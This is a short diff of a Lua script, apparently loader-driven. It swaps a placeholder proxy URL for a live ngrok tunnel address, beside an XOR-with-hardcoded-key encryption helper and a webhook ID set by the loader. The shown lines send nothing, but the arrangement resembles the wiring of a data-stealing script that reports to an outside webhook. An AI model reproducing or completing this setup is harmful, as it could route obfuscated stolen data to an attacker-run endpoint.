@@ -91,7 +91,7 @@ local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9
 
 -- ================= Eternal Darkness Configuration =================
 
-local PROXY_URL = "https://your-proxy-url.ngrok-free.app/api/proxy/"
+local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.dev/api/proxy/"
 
 -- EXTERNAL GLOBALS - SET BY LOADER
 local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
